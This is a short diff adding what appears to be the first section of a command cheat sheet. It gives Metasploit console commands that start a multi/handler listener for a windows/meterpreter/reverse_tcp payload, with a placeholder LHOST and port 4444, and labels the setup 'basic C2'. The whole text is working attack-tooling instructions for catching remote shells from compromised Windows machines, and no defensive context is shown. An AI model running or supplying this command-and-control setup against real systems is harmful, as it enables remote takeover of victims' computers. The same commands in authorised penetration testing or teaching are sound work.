@@ -1,0 +1,14 @@
+# =======================
+# 1. Metasploit Framework
+# Purpose: Set up a reverse TCP Meterpreter session (basic C2)
+# =======================
+msfconsole
+
+# Inside Metasploit console:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your-IP>
+set LPORT 4444
+run
+
+# =======================
